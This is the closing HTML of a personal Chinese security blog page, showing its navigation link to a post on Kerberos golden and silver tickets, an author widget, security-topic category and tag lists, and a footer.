+        <a href="/2022/06/24/ticket/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">黄金票据 &amp;&amp; 白银票据</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/blog/blog.jpg" class="soft-size--round soft-style--box" alt="WsyKer">
+    
+    
+      <h2>WsyKer</h2>
+    
+    
+      <p>要做自己喜欢做的事</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>9</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        6
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        3
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>一个热爱打游戏打篮球的脚本小子，欢迎找我闲聊</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">
+            内网安全 (3)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/">
+            神兵利器 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97/">
+            杀软对抗 (2)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">
+            硬件安全 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">
+            红蓝对抗 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/">
+            中间件安全 (1)
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/" style="font-size: 10px;" class="tags-cloud-0">中间件安全</a> <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="font-size: 20px;" class="tags-cloud-10">内网安全</a> <a href="/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/" style="font-size: 10px;" class="tags-cloud-0">硬件安全</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/WsyKer" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+      
+    </div>
+     
+    <p>&copy; 2022 <a href="/" target="_blank">WsyKer</a></p>
+
+    
+      <p><a href="https://beian.miit.gov.cn" target="_blank">豫ICP备2021003558号</a></p>
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
